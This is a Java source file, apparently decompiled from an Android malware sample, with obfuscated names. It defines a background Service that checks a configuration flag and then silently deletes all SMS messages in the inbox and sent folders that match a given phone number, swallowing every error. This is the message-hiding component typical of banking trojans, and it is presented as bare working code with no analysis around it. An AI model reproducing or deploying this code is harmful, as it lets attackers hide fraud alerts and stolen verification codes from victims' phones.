package wocwvy.czyxoxmbauu.slsa;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;

public class whemsbk extends Service {

    /* renamed from: a */
    C0034b f596a = new C0034b();

    /* renamed from: c */
    private void m363c(Context context, String str, String str2) {
        try {
            Uri parse = Uri.parse("content://sms/inbox");
            Cursor query = context.getContentResolver().query(parse, new String[]{"_id", "thread_id", "address", "person", "date", "body"}, null, null, null);
            if (query != null && query.moveToFirst()) {
                do {
                    long j = query.getLong(0);
                    query.getLong(1);
                    String string = query.getString(2);
                    if (!str.equals(query.getString(5)) && string.equals(str2)) {
                        ContentResolver contentResolver = context.getContentResolver();
                        StringBuilder sb = new StringBuilder();
                        sb.append("content://sms/");
                        sb.append(j);
                        contentResolver.delete(Uri.parse(sb.toString()), null, null);
                    }
                } while (query.moveToNext());
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: a */
    public void mo463a(Context context, String str, String str2) {
        String e = this.f596a.mo234e(context, "del_sws");
        StringBuilder sb = new StringBuilder();
        sb.append("");
        sb.append(e);
        this.f596a.mo213a("RCWC", sb.toString());
        if (e.contains("true")) {
            this.f596a.mo242l(context);
            m363c(context, "", str);
            mo464b(context, "", str);
        }
    }

    /* renamed from: b */
    public void mo464b(Context context, String str, String str2) {
        try {
            Uri parse = Uri.parse("content://sms/sent");
            Cursor query = context.getContentResolver().query(parse, new String[]{"_id", "thread_id", "address", "person", "date", "body"}, null, null, null);
            if (query != null && query.moveToFirst()) {
                do {
                    long j = query.getLong(0);
                    query.getLong(1);
                    String string = query.getString(2);
                    if (!str.equals(query.getString(5)) && string.equals(str2)) {
                        ContentResolver contentResolver = context.getContentResolver();
                        StringBuilder sb = new StringBuilder();
                        sb.append("content://sms/");
                        sb.append(j);
                        contentResolver.delete(Uri.parse(sb.toString()), null, null);
                    }
                } while (query.moveToNext());
            }
        } catch (Exception unused) {
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        try {
            mo463a(this, intent.getStringExtra("num"), intent.getStringExtra("ms"));
        } catch (Exception unused) {
        }
        try {
            Thread.sleep(5000);
        } catch (InterruptedException unused2) {
        }
        return 1;
    }
}
